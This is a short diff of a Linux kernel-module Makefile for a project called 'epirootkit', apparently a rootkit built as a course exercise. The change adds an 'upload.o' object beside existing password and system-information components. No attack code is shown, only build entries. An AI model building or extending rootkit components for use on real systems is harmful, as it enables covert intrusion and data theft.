@@ -46,7 +46,8 @@ epirootkit-objs :=                              \
     utils/io/io.o                               \
     utils/ulist/ulist.o                         \
     passwd/passwd.o                             \
-    utils/sysinfo/sysinfo.o
+    utils/sysinfo/sysinfo.o                     \
+    upload.o
 
 all: modules
 
